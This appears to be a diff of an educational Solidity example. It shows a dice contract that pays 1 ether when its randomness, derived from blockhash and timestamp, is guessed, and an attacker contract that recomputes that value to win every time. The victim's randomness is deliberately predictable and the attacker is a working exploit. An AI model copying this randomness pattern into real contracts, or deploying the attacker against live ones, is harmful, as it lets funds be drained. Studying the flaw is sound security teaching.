@@ -1,38 +1,16 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
+pragma solidity ^0.8.22;
 
 contract Randomness {
-    error Randomness_SentError();
-
-    function encode(string memory _text) public pure returns (bytes memory) {
-        return abi.encode(_text);
-    }
-
-    function encodePacked(
-        string memory _text
-    ) public pure returns (bytes memory) {
-        return abi.encodePacked(_text);
-    }
-
-    function hashData(string memory _text) public pure returns (bytes32) {
-        return keccak256(abi.encodePacked(_text));
-    }
-
-    function getBlockhash() public view returns (bytes32) {
-        return blockhash(block.number - 1);
-    }
-
-    function getBlockNumber() public view returns (uint) {
-        return block.number;
-    }
+    error Randomness_SentEtherError();
 
     function guessDice(uint8 _guessDice) public {
         uint8 dice = _random();
+
         if (dice == _guessDice) {
             (bool sent, ) = msg.sender.call{value: 1 ether}("");
-
             if (!sent) {
-                revert Randomness_SentError();
+                revert Randomness_SentEtherError();
             }
         }
     }
@@ -43,29 +21,46 @@ contract Randomness {
                 abi.encodePacked(blockhash(block.number - 1), block.timestamp)
             )
         );
+
         return uint8(blockValue % 5) + 1;
-    }
-
-    function getBlockValue() public view returns (uint) {
-        uint256 blockValue = uint(
-            keccak256(
-                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
-            )
-        );
-
-        return blockValue;
     }
 
     function getRandom() public view returns (uint8) {
         return _random();
     }
+
+    function getBlockTimestamp() public view returns (uint) {
+        return block.timestamp;
+    }
+
+    function getBlockNumber() public view returns (uint) {
+        return block.number;
+    }
+
+    function getBlockHash() public view returns (bytes32) {
+        return blockhash(block.number - 1);
+    }
+
+    function getEncode(string memory _text) public pure returns (bytes memory) {
+        return abi.encode(_text);
+    }
+
+    function getEncodePacked(
+        string memory _text
+    ) public pure returns (bytes memory) {
+        return abi.encodePacked(_text);
+    }
+
+    function getHashData(string memory _text) public pure returns (bytes32) {
+        return keccak256(abi.encodePacked(_text));
+    }
 }
 
 contract AttackRandomness {
-    Randomness private immutable i_randomness;
+    Randomness immutable i_randomness;
 
-    constructor(address _target) {
-        i_randomness = Randomness(_target);
+    constructor(address _randomness) {
+        i_randomness = Randomness(_randomness);
     }
 
     receive() external payable {}
@@ -77,7 +72,8 @@ contract AttackRandomness {
             )
         );
 
-        uint8 _guessDice = uint8(blockValue % 5) + 1;
-        i_randomness.guessDice(_guessDice);
+        uint8 guessDice = uint8(blockValue % 5) + 1;
+
+        i_randomness.guessDice(guessDice);
     }
 }
